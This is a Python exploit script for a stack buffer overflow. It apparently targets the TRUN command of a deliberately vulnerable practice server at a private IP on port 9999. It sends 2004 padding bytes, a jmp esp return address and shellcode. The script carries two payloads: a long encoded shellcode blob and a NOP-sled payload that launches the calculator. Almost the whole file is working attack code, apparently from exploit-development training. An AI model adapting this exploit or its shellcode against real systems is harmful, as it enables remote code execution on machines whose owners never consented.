import socket
from socket import *

s = socket(AF_INET,SOCK_STREAM) # socket creation
s.connect(("172.16.16.145",9999)) #making connection with server

data=s.recv(1024)



print(b"Recieved: "+ data)

# 625011EB - jmp esp

eip = b"\xeb\x11\x50\x62"

shellcode =("\xdb\xd7\xd9\x74\x24\xf4\xb8\x54\x92\x4d\xe5\x5a\x2b\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x96\x96\xaf\x10\xea\x7f\xad"
"\xdb\x12\x80\xd2\x52\xf7\xb1\xd2\x01\x7c\xe1\xe2\x42\xd0\x0e"
"\x88\x07\xc0\x85\xfc\x8f\xe7\x2e\x4a\xf6\xc6\xaf\xe7\xca\x49"
"\x2c\xfa\x1e\xa9\x0d\x35\x53\xa8\x4a\x28\x9e\xf8\x03\x26\x0d"
"\xec\x20\x72\x8e\x87\x7b\x92\x96\x74\xcb\x95\xb7\x2b\x47\xcc"
"\x17\xca\x84\x64\x1e\xd4\xc9\x41\xe8\x6f\x39\x3d\xeb\xb9\x73"
"\xbe\x40\x84\xbb\x4d\x98\xc1\x7c\xae\xef\x3b\x7f\x53\xe8\xf8"
"\xfd\x8f\x7d\x1a\xa5\x44\x25\xc6\x57\x88\xb0\x8d\x54\x65\xb6"
"\xc9\x78\x78\x1b\x62\x84\xf1\x9a\xa4\x0c\x41\xb9\x60\x54\x11"
"\xa0\x31\x30\xf4\xdd\x21\x9b\xa9\x7b\x2a\x36\xbd\xf1\x71\x5f"
"\x72\x38\x89\x9f\x1c\x4b\xfa\xad\x83\xe7\x94\x9d\x4c\x2e\x63"
"\xe1\x66\x96\xfb\x1c\x89\xe7\xd2\xda\xdd\xb7\x4c\xca\x5d\x5c"
"\x8c\xf3\x8b\xf3\xdc\x5b\x64\xb4\x8c\x1b\xd4\x5c\xc6\x93\x0b"
"\x7c\xe9\x79\x24\x17\x10\xea\xe7\xf8\x14\xd2\x9f\xfa\x28\x33"
"\x3c\x72\xce\x59\xac\xd2\x59\xf6\x55\x7f\x11\x67\x99\x55\x5c"
"\xa7\x11\x5a\xa1\x66\xd2\x17\xb1\x1f\x12\x62\xeb\xb6\x2d\x58"
"\x83\x55\xbf\x07\x53\x13\xdc\x9f\x04\x74\x12\xd6\xc0\x68\x0d"
"\x40\xf6\x70\xcb\xab\xb2\xae\x28\x35\x3b\x22\x14\x11\x2b\xfa"
"\x95\x1d\x1f\x52\xc0\xcb\xc9\x14\xba\xbd\xa3\xce\x11\x14\x23"
"\x96\x59\xa7\x35\x97\xb7\x51\xd9\x26\x6e\x24\xe6\x87\xe6\xa0"
"\x9f\xf5\x96\x4f\x4a\xbe\xb7\xad\x5e\xcb\x5f\x68\x0b\x76\x02"
"\x8b\xe6\xb5\x3b\x08\x02\x46\xb8\x10\x67\x43\x84\x96\x94\x39"
"\x95\x72\x9a\xee\x96\x56")

calc = (b"\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7")

s.sendall(b'TRUN / .' + b"A"*2004 + eip  + calc)
data= s.recv(1024)
print(b"Recieved: "+ str(data))
s.close()
